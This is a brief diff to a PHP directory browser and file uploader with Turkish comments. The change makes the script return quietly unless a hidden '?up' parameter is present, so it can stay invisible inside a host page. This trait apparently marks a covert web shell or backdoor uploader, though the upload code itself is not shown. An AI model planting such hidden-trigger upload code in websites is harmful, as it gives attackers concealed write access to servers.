@@ -3,14 +3,15 @@
 $root = '/home'; // Başlangıç dizini
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
+// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
+if (!isset($_GET['up'])) {
+    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
+    return; // veya die(); kullanabilirsiniz
+}
+
 // Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
 if (strpos($current_dir, realpath($root)) !== 0) {
     die('İzin verilmedi!');
-}
-
-// Eğer ?up parametresi yoksa hiçbir şey yapma
-if (!isset($_GET['up'])) {
-    exit; // Sayfayı tamamen boş bırakmak için çık
 }
 
 // Dosya yükleme işlemi
